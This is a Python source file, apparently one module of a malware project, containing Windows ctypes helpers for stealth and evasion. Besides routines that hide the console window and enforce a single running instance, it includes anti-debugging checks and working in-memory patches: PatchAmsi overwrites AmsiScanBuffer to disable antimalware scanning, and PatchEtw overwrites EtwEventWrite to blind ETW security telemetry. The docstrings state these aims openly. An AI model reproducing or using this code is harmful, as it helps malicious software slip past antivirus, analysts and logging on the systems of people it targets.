import ctypes
import ctypes.wintypes
import os
import sys


class Syscalls:
    kernel32 = ctypes.windll.kernel32
    ntdll = ctypes.windll.ntdll
    user32 = ctypes.windll.user32
    advapi32 = ctypes.windll.advapi32

    @staticmethod
    def HideConsole() -> None:
        """Hide the console window using ShowWindow(GetConsoleWindow(), SW_HIDE)."""
        hwnd = Syscalls.kernel32.GetConsoleWindow()
        if hwnd:
            Syscalls.user32.ShowWindow(hwnd, 0)  # SW_HIDE = 0

    @staticmethod
    def ShowConsole() -> None:
        """Show the console window."""
        hwnd = Syscalls.kernel32.GetConsoleWindow()
        if hwnd:
            Syscalls.user32.ShowWindow(hwnd, 5)  # SW_SHOW = 5

    @staticmethod
    def CreateMutex(name: str) -> bool:
        """Create a named mutex. Returns True if created (first instance), False if already exists."""
        Syscalls.kernel32.CreateMutexW(None, False, name)
        return ctypes.get_last_error() != 183  # ERROR_ALREADY_EXISTS

    @staticmethod
    def IsDebuggerPresent() -> bool:
        """Check if a user-mode debugger is attached."""
        return bool(Syscalls.kernel32.IsDebuggerPresent())

    @staticmethod
    def NtQueryInformationProcess() -> bool:
        """Check ProcessDebugPort (info class 7). Returns True if debugger detected."""
        debug_port = ctypes.c_ulong(0)
        status = Syscalls.ntdll.NtQueryInformationProcess(
            ctypes.c_void_p(-1),  # current process handle
            7,                     # ProcessDebugPort
            ctypes.byref(debug_port),
            ctypes.sizeof(debug_port),
            None
        )
        return status == 0 and debug_port.value != 0

    @staticmethod
    def PatchAmsi() -> bool:
        """Patch AmsiScanBuffer to return E_INVALIDARG, neutering AMSI scans.
        
        Overwrites first 6 bytes of AmsiScanBuffer with:
            mov eax, 0x80070057  ; E_INVALIDARG
            ret
        Byte sequence: B8 57 00 07 80 C3
        """
        try:
            amsi = ctypes.windll.LoadLibrary('amsi.dll')
            addr = Syscalls.kernel32.GetProcAddress(
                ctypes.cast(amsi._handle, ctypes.c_void_p),
                b'AmsiScanBuffer'
            )
            if not addr:
                return False

            patch = b'\xb8\x57\x00\x07\x80\xc3'
            old_protect = ctypes.c_ulong(0)

            Syscalls.kernel32.VirtualProtect(
                ctypes.c_void_p(addr), len(patch),
                0x40,  # PAGE_EXECUTE_READWRITE
                ctypes.byref(old_protect)
            )
            ctypes.memmove(ctypes.c_void_p(addr), patch, len(patch))
            Syscalls.kernel32.VirtualProtect(
                ctypes.c_void_p(addr), len(patch),
                old_protect.value,
                ctypes.byref(old_protect)
            )
            return True
        except Exception:
            return False

    @staticmethod
    def PatchEtw() -> bool:
        """Patch EtwEventWrite in ntdll to return SUCCESS (0), blinding ETW telemetry.
        
        Overwrites first 3 bytes with:
            xor eax, eax  ; zero return value
            ret
        Byte sequence: 33 C0 C3
        """
        try:
            addr = Syscalls.kernel32.GetProcAddress(
                ctypes.cast(Syscalls.ntdll._handle, ctypes.c_void_p),
                b'EtwEventWrite'
            )
            if not addr:
                return False

            patch = b'\x33\xc0\xc3'
            old_protect = ctypes.c_ulong(0)

            Syscalls.kernel32.VirtualProtect(
                ctypes.c_void_p(addr), len(patch),
                0x40, ctypes.byref(old_protect)
            )
            ctypes.memmove(ctypes.c_void_p(addr), patch, len(patch))
            Syscalls.kernel32.VirtualProtect(
                ctypes.c_void_p(addr), len(patch),
                old_protect.value,
                ctypes.byref(old_protect)
            )
            return True
        except Exception:
            return False
